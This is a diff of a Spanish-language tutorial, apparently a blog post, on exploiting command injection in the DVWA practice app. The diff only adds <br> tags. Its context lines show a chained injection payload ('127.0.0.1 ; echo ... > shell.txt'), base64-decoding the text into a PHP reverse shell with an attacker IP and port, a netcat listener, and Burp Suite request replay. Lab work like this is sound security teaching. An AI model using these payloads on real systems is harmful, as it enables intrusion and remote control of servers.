@@ -48,7 +48,7 @@ $ip = '192.168.1.46';  # CHANGE THIS
 $port = 1234;       # CHANGE THIS
 ```
 
-
+<br>
 
 Una vez modificado, tendremos que dirigirnos a alguna página web de codificación en **`Base64`** y copiar el resultado. Ahora, en la web objetivo introduciremos la `IP`, seguida de un `echo` con el código en **`Base64`** copiado y lo almacenaremos en un archivo ".txt"
 
@@ -56,13 +56,13 @@ Una vez modificado, tendremos que dirigirnos a alguna página web de codificaci�
  127.0.0.1 ; echo "pega-aquí-el-código-en-base64" > shell.txt
 ```
 
-
+<br>
 
 Y comprobaremos que se ha generado el fichero en el servidor, realizando un `ls -l`.
 
 ![](/patrickcampillo/assets/img/cinjection_rshell/1.png)
 
-
+<br>
 
 Seguidamente, volveremos a introducir una dirección `IP`, seguida de un `cat` del fichero generado, y utilizando una tubería para almacenar el texto decodificado en un nuevo fichero ".php".
 
@@ -76,7 +76,7 @@ Y volveremos a comprobar que todo ha salido correctamente.
 
 ![](/patrickcampillo/assets/img/cinjection_rshell/2.png)
 
-
+<br>
 
 Una vez todo está listo, ya solo deberemos ejecutar **`netcat`** , de la siguiente forma:
 
@@ -112,7 +112,7 @@ Primero, al iniciar **`Burp Suite`**, nos tendremos que dirigir al menú `Proxy`
 
 ![](/patrickcampillo/assets/img/cinjection_rshell/1-1621005581202.png)
 
-
+<br>
 
 En el navegador `Chromium` que se abre, introduciremos la dirección de la página objetivo. En este caso, es la `IP` del `Docker` que contiene la aplicación para practicar vulnerabilidades `dvwa`. Y introduciremos una dirección a la que se realizará un "ping".
 
@@ -122,7 +122,7 @@ En el navegador `Chromium` que se abre, introduciremos la dirección de la pági
 
 ![](/patrickcampillo/assets/img/cinjection_rshell/3-1621005851075.png)
 
-
+<br>
 
 En este momento, volveremos a **`Burp Suite`**, y deberemos acceder a `HTTP History` del menú `Proxy`. Aquí podremos ver el contenido de la petición que se ha realizado al servidor, observando la `IP` introducida.
 
@@ -130,13 +130,13 @@ En este momento, volveremos a **`Burp Suite`**, y deberemos acceder a `HTTP Hist
 
 ![](/patrickcampillo/assets/img/cinjection_rshell/4-1.png)
 
-
+<br>
 
 Y habremos de enviar esta petición a la sección `Repeater`. Podemos hacerlo haciendo click derecho sobre la propia petición, o si la tenemos seleccionada utilizando el atajo `Ctrl+R`.
 
 ![](/patrickcampillo/assets/img/cinjection_rshell/4-2.png)
 
-
+<br>
 
 Una vez enviada nos dirigimos a este menú, y volvemos a enviar la petición. Nos mostrará la respuesta, y,  para agilizar el proceso, podemos buscar donde se encuentra la respuesta a la petición del "ping". 
 
@@ -144,7 +144,7 @@ Una vez enviada nos dirigimos a este menú, y volvemos a enviar la petición. No
 
 ![](/patrickcampillo/assets/img/cinjection_rshell/5.png)
 
-
+<br>
 
 Entonces, para que nos muestre directamente este apartado de la respuesta, para cada petición,  introduciremos la cadena `<pre>` en la barra de búsqueda que se encuentra en la parte inferior de la respuesta, seleccionaremos la llave de ajuste y habilitaremos la opción "Auto-scroll to match when the text change".
 
